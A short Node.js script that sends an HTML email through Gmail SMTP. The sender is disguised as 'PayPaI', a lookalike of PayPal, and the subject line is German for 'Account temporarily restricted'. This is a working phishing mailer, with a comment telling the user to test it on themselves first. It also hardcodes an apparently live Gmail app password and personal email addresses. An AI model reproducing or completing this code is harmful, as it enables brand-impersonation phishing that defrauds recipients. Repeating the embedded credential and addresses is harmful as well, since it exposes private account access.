const nodemailer = require("nodemailer");
const fs = require("fs");

const html = fs.readFileSync("./mail.html", "utf8");

// GMAIL DATEN (ECHT & LEGITIM EINTRAGEN)
const GMAIL_USER = "paypai.service.benz@gmail.com";
const GMAIL_APP_PASS = "osrvqiudzzybrjum";
const TO = "holzerluis3@gmail.com"; // zuerst an dich selbst testen

async function main() {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: GMAIL_USER,
      pass: GMAIL_APP_PASS,
    },
  });

  // Login testen
  await transporter.verify();
  console.log("Gmail SMTP Login OK");

  const info = await transporter.sendMail({
    from: `PayPaI <${GMAIL_USER}>`,
    to: TO,
    subject: "Konto vorübergehend eingeschränkt",
    html,
    text: "Das ist die Text-Version der Mail.",
  });

  console.log("Gesendet:", info.messageId);
}

main().catch((err) => {
  console.error("Fehler:", err);
  process.exit(1);
});